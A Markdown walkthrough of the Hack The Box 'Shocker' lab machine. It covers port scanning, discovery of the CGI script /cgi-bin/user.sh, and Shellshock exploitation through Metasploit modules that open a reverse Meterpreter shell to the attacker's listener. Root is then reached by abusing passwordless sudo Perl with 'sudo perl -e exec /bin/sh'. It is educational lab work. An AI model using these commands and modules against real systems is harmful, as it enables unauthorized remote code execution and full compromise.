# Hack The Box - Shocker Writeup

> A complete walkthrough of the **Shocker** machine from Hack The Box, covering reconnaissance, CGI enumeration, Shellshock exploitation, initial access, and privilege escalation.

---

## Machine Information

| Platform     | Machine | Difficulty | OS    |
| ------------ | ------- | ---------- | ----- |
| Hack The Box | Shocker | Linux      | Linux |

> **Note:** Shocker is commonly considered a useful machine for practicing fundamental enumeration and exploitation techniques relevant to OSCP-style labs.

---

# 📌 Overview

**Shocker** is a Linux-based Hack The Box machine that demonstrates the dangers of outdated CGI configurations and vulnerable Bash environments.

The primary attack path involves:

* Network enumeration
* Web application enumeration
* CGI directory discovery
* Shellshock exploitation
* Initial access as `shelly`
* Sudo privilege enumeration
* Abusing allowed Perl execution via `sudo`
* Root access

---

# 🗂️ Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Service Enumeration](#-service-enumeration)
* [Web Enumeration](#-web-enumeration)
* [CGI Discovery](#-cgi-discovery)
* [Shellshock Exploitation](#-shellshock-exploitation)
* [Initial Access](#-initial-access)
* [User Flag](#-user-flag)
* [Privilege Escalation](#-privilege-escalation)
* [Perl Sudo Abuse](#-perl-sudo-abuse)
* [Root Access](#-root-access)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# 🔍 Reconnaissance

The target IP address provided was:

```text id="shockerip"
10.129.75.247
```

---

## Full Port Scan

Starting with an all-port scan:

```bash id="allportscan"
nmap -p- --min-rate 5000 10.129.75.247
```

### Result

```text id="portsresult"
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Initially, two ports were discovered:

| Port | Service       |
| ---- | ------------- |
| 80   | HTTP          |
| 2222 | Unknown / SSH |

A background scan for additional ports was also performed while continuing enumeration.

---

# 🔎 Service Enumeration

Let's perform service and version detection.

```bash id="servicescan"
nmap -sC -sV -p80,2222 10.129.75.247
```

### Result

```text id="serviceresult"
80/tcp open  http
Apache httpd 2.4.18 (Ubuntu)

2222/tcp open  ssh
OpenSSH 7.2p2 Ubuntu
```

The web server was running:

```text id="apacheversion"
Apache/2.4.18 (Ubuntu)
```

The SSH service was running on a non-standard port:

```text id="sshport"
2222
```

The supported HTTP methods were:

```text id="methods"
GET
HEAD
POST
OPTIONS
```

Since HTTP was exposed, the next step was to enumerate the web application.

---

# 🌐 Web Enumeration

The website was opened using Burp Suite's browser.

The page itself did not reveal much interesting information apart from an image.

The image was downloaded for further inspection in case it contained hidden information or metadata.

Since the initial page did not expose useful functionality, directory and file enumeration became the primary focus.

---

## Adding the Target to `/etc/hosts`

To make enumeration easier, the target was added to the local hosts file.

```bash id="hostentry"
sudo nano /etc/hosts
```

Entry:

```text id="hostmapping"
10.129.75.247 shocker.htb
```

The target could now be accessed using:

```text id="hostname"
http://shocker.htb
```

---

# 📂 CGI Enumeration

Due to the limited functionality available on the website, the machine name **Shocker** provided an important clue.

A likely attack surface was:

```text id="cgibin"
/cgi-bin/
```

The machine name and Apache web server suggested the possibility of a vulnerable CGI script combined with the **Shellshock** vulnerability.

Fuzzing for common CGI-related extensions was performed.

Extensions tested included:

```text id="extensions"
.cgi
.sh
.pl
.py
```

Directory enumeration revealed the following endpoint:

```text id="targetscript"
/cgi-bin/user.sh
```

Full URL:

```text id="targeturl"
http://shocker.htb/cgi-bin/user.sh
```

This became the primary target for exploitation.

---

# 💥 Shellshock Exploitation

Shellshock is a vulnerability affecting certain versions of the Bash shell.

The target was running a CGI script:

```text id="cgiendpoint"
/cgi-bin/user.sh
```

This provided a possible attack vector when combined with the Shellshock vulnerability.

A Metasploit module was identified:

```text id="scanner"
auxiliary/scanner/http/apache_mod_cgi_bash_env
```

Before attempting command execution, the module was used to verify whether the target was vulnerable.

---

## Vulnerability Check

Start Metasploit:

```bash id="msfconsole"
msfconsole
```

Select the scanner:

```text id="module1"
use auxiliary/scanner/http/apache_mod_cgi_bash_env
```

Configure the target:

```text id="scannerconfig"
set RHOST 10.129.75.247
set TARGETURI /cgi-bin/user.sh
```

Run the scanner:

```text id="scanexploit"
exploit
```

### Result

```text id="vulnresult"
[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The command execution confirmed that the CGI script was vulnerable.

The target was executing commands as:

```text id="initialuser"
shelly
```

---

# 🐚 Initial Access

After confirming the Shellshock vulnerability, a command execution module was used.

Metasploit module:

```text id="execmodule"
exploit/multi/http/apache_mod_cgi_bash_env_exec
```

Configure the listener:

```text id="exploitconfig"
set LHOST <YOUR_IP>
set RHOST shocker.htb
set TARGETURI /cgi-bin/user.sh
```

Example configuration:

```text id="exampleconfig"
set LHOST 10.10.15.95
set RHOST shocker.htb
set TARGETURI /cgi-bin/user.sh
```

Execute the exploit:

```text id="runexploit"
exploit
```

A reverse shell handler was started:

```text id="handler"
[*] Started reverse TCP handler on 10.10.15.95:4444
```

A Meterpreter session was successfully obtained.

---

# 👤 Initial Shell

Checking the home directory:

```text id="meterpreterls"
(Meterpreter 1)(/home/shelly) > ls
```

Contents:

```text id="homedir"
.bash_history
.bash_logout
.bashrc
.cache
.nano
.profile
.selected_editor
user.txt
```

We successfully gained access as:

```text id="username"
shelly
```

---

# 🚩 User Flag

The user flag was located in the home directory.

```text id="readuserflag"
(Meterpreter 1)(/home/shelly) > cat user.txt
```

At this stage, the user-level portion of the machine was completed.

---

# ⬆️ Privilege Escalation

The next step was to enumerate sudo permissions.

```bash id="sudol"
sudo -l
```

Output:

```text id="sudooutput"
Matching Defaults entries for shelly on Shocker:
    env_reset,
    mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

This is a critical finding.

The user `shelly` was allowed to execute:

```text id="perlpath"
/usr/bin/perl
```

as `root` without requiring a password.

---

# 🔓 Perl Sudo Abuse

Since Perl can execute system commands, this configuration can be abused to spawn a privileged shell.

The following command was used:

```bash id="perlexploit"
sudo perl -e 'exec "/bin/sh"'
```

After executing the command:

```bash id="checkid"
id
```

Output:

```text id="rootid"
uid=0(root) gid=0(root) groups=0(root)
```

We successfully escalated privileges to:

```text id="root"
root
```

---

# 👑 Root Access

With root privileges obtained, the root flag could be accessed directly.

```bash id="rootflag"
cat /root/root.txt
```

The machine was now fully compromised.

---

# 🗺️ Attack Path Summary

```text id="attackpath"
┌─────────────────────────┐
│      Nmap Scan          │
│                         │
│ 80 HTTP                 │
│ 2222 SSH                │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│   Web Enumeration       │
│                         │
│ Apache Web Server       │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│   Directory Fuzzing     │
│                         │
│ /cgi-bin/user.sh        │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│  Shellshock Discovery   │
│                         │
│ Vulnerable CGI Script   │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│ Remote Code Execution   │
│                         │
│ User: shelly            │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│     sudo -l             │
│                         │
│ Perl as root            │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│     Perl GTFOBin        │
│                         │
│ sudo perl -e ...        │
└────────────┬────────────┘
             │
             ▼
┌─────────────────────────┐
│       ROOT ACCESS       │
│                         │
│ user.txt + root.txt     │
└─────────────────────────┘
```

---

# 🧠 Key Takeaways

## 🔹 Proper Enumeration Matters

The initial web page contained very little information.

However, further enumeration revealed:

```text id="keyfinding"
/cgi-bin/user.sh
```

This demonstrates the importance of directory and file enumeration.

---

## 🔹 Machine Names Can Provide Hints

The machine name:

```text id="machinename"
Shocker
```

provided a useful clue toward investigating:

```text id="shellshock"
Shellshock
```

While assumptions should always be verified through enumeration, contextual hints can help prioritize potential attack surfaces.

---

## 🔹 CGI Scripts Can Be Dangerous

CGI applications that pass attacker-controlled data into vulnerable shell environments can create serious security risks.

In this case:

```text id="cgichain"
/cgi-bin/user.sh
        ↓
Vulnerable Bash Environment
        ↓
Shellshock
        ↓
Remote Command Execution
```

---

## 🔹 Always Check Sudo Permissions

One of the most important privilege escalation commands is:

```bash id="importantcommand"
sudo -l
```

This command revealed that the current user could execute Perl as root:

```text id="sudoissue"
(root) NOPASSWD: /usr/bin/perl
```

A seemingly harmless binary can become a privilege escalation vector when incorrectly configured with `sudo`.

---

## 🔹 GTFOBins Is a Valuable Resource

When a binary is available through `sudo`, SUID, or another privileged execution mechanism, it should be checked for known abuse techniques.

In this case, Perl was capable of spawning a shell:

```bash id="finalpayload"
sudo perl -e 'exec "/bin/sh"'
```

---

# 🛠️ Tools Used

```text id="tools"
Nmap
Burp Suite
DirBuster
Metasploit Framework
Meterpreter
GTFOBins
Linux Enumeration Commands
```

---

# 📚 Vulnerabilities and Misconfigurations

| Finding               | Component  | Impact                   |
| --------------------- | ---------- | ------------------------ |
| Shellshock            | CGI / Bash | Remote Command Execution |
| Vulnerable CGI Script | Apache     | Initial Access           |
| Passwordless Sudo     | Perl       | Privilege Escalation     |

---

# 🎯 Attack Chain

```text id="attackchain"
Web Enumeration
       │
       ▼
Discover /cgi-bin/user.sh
       │
       ▼
Identify Shellshock
       │
       ▼
Remote Command Execution
       │
       ▼
Gain Access as shelly
       │
       ▼
Enumerate sudo Permissions
       │
       ▼
Perl Allowed as Root
       │
       ▼
Spawn Root Shell
       │
       ▼
Capture root.txt
```

---

# 🏁 Final Notes

Hack The Box **Shocker** is a great example of how a relatively simple attack chain can result in full system compromise.

The machine focuses on two critical areas:

1. **Web application enumeration and Shellshock exploitation**
2. **Linux privilege escalation through insecure sudo configuration**

The complete attack path was:

```text id="simplepath"
Nmap
  ↓
Web Enumeration
  ↓
CGI Discovery
  ↓
Shellshock
  ↓
Shell as shelly
  ↓
sudo -l
  ↓
Perl GTFOBin
  ↓
ROOT
```

The biggest lesson from this machine is simple:

> **Enumeration leads to exploitation, and privilege enumeration leads to full compromise.**

---

## ⚠️ Disclaimer

This writeup is created strictly for **educational purposes** and documents techniques performed against the intentionally vulnerable **Hack The Box Shocker** machine in an authorized laboratory environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Happy Hacking! 🚩</b>
</p>
